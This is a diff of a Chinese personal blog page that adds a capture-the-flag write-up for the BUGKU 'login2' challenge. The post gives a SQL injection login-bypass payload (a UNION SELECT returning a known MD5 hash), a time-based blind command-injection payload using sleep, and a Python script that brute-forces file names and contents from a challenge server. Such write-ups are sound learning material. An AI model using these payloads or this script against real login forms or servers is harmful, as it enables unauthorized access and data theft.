@@ -294,6 +294,198 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.mr-guo.xin/2018/09/29/BUGKU/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="super/guo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/kola.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="super/guo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/09/29/BUGKU/" itemprop="url">BUGKU</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-29T08:11:31+08:00">
+                2018-09-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web-Security/" itemprop="url" rel="index">
+                    <span itemprop="name">Web-Security</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  409
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  2
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="BUGKU"><a href="#BUGKU" class="headerlink" title="BUGKU"></a>BUGKU</h2><h3 id="login2-SKCTF"><a href="#login2-SKCTF" class="headerlink" title="login2(SKCTF)"></a>login2(SKCTF)</h3><pre><code>进入后出现登录界面，首先尝试用万能密码登录无果；
+抓包发现响应包里有tip
+</code></pre><p><img src="/2018/09/29/BUGKU/10-03/login2.png" alt=""></p>
+<p>base64解码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT username,password FROM admin WHERE username='"</span>.<span class="variable">$username</span>.<span class="string">"'"</span>;</span><br><span class="line"><span class="keyword">if</span> (!empty(<span class="variable">$row</span>) &amp;&amp; <span class="variable">$row</span>[<span class="string">'password'</span>]===md5(<span class="variable">$password</span>))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>登录的流程为：
+1.根据输入的用户名查询出用户名和口令
+2.对比输入的口令的md5值和查询出的口令是否相等
+
+接下来构造payload：
+username:   &apos; union select null,&apos;c4ca4238a0b923820dcc509a6f75849b&apos; #    
+// &apos;闭合前面的查询语句，使使查询语句结果的password永远返回1的md5值
+password:   1
+
+成功登录后进入远程监控系统，尝试了各种命令执行绕过发现这里可以通过执行sleep函数来进行命令盲注（此处参考了一些writeup）
+构造payload：
+postdata： c=123;a=`ls`;b=&quot;a&quot;;if [ ${a:0:1} == $b ];then sleep 2;fi
+//读取目录
+
+这里自己用python写了个脚本，贴上代码（本人是新手，写的比较粗糙）,首先跑出目录，会发现有flag字样的txt文件，在用脚本读取出文件内容发现flag
+</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import requests</span><br><span class="line">stri=<span class="string">'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;[]|\/+-*.0123456789!@#$%^&amp;*()=_&lt;&gt;, '</span></span><br><span class="line">url=<span class="string">'http://123.206.31.85:49165/index.php'</span></span><br><span class="line">data_post= &#123;<span class="string">'c'</span>:<span class="string">'c=123;a=`ls`;b="s";if [ $&#123;a:1:1&#125; == $b ];then sleep 2;fi'</span>&#125;</span><br><span class="line">cookies=&#123;<span class="string">'PHPSESSID'</span>:<span class="string">'hbccmcbln7ul8lc0hgh2q9rrg4'</span>&#125;</span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(0,50):</span><br><span class="line">  <span class="keyword">for</span> y <span class="keyword">in</span> stri:</span><br><span class="line">    <span class="comment"># 查看目录</span></span><br><span class="line">    data_post[<span class="string">'c'</span>] = <span class="string">"c=123;a=`ls`;b=\""</span> + y + <span class="string">"\";if [ <span class="variable">$&#123;a:" + str(x) + ":1&#125;</span> == <span class="variable">$b</span> ];then sleep 2;fi"</span> </span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># 查看文件内容</span></span><br><span class="line">    <span class="comment">#data_post['c'] = "c=123;a=`cat xx`;b=\"" + y + "\";if [ $&#123;a:" + str(x) + ":1&#125; == $b ];then sleep 2;fi"</span></span><br><span class="line">    <span class="built_in">print</span>(data_post)</span><br><span class="line">    r = requests.post(url,data=data_post,cookies=cookies)</span><br><span class="line">    time = r.elapsed.seconds</span><br><span class="line">    <span class="keyword">if</span> time&gt;1:</span><br><span class="line">      result += y</span><br><span class="line">      <span class="built_in">break</span></span><br><span class="line">  <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://www.mr-guo.xin/2018/09/26/NYCtf/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -379,7 +571,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1,135
+                  1,133
                 </span>
               
 
@@ -417,7 +609,7 @@
 
       
         
-          <h2 id="南邮ctf之旅-无图"><a href="#南邮ctf之旅-无图" class="headerlink" title="南邮ctf之旅(无图)"></a>南邮ctf之旅(无图)</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>查看页面源代码就ok了</p>
+          <h2 id="南邮ctf-无图"><a href="#南邮ctf-无图" class="headerlink" title="南邮ctf(无图)"></a>南邮ctf(无图)</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>查看页面源代码就ok了</p>
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2018/09/26/NYCtf/#more" rel="contents">
@@ -855,7 +1047,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-count">4</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -962,7 +1154,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共2.8k字</span>
+  <span class="post-count">博客全站共3.2k字</span>
 </div>
         
 
